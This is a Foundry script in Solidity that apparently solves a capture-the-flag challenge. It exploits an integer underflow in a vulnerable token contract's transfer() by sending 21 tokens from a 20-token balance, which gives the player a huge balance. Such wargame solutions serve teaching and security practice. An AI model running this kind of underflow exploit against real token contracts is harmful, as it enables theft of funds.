// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

/**
 * @title Challenge 05 Solution Script
 * @notice Exploit uint256 underflow in transfer() to get massive balance
 */
contract TokenSolution is Script {
    address constant INSTANCE = 0x92A0C83D2Fa19cF33E7Fd99901C4595e17b49147;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        IToken target = IToken(INSTANCE);

        vm.startBroadcast(deployerPrivateKey);

        // Player starts with 20 tokens. Transfer 21 to any address
        // This causes an underflow: 20 - 21 wraps to a huge number
        target.transfer(address(1), 21);

        vm.stopBroadcast();

        console.log("Player balance:", target.balanceOf(player));
        console.log("Challenge 05 completed!");
    }
}
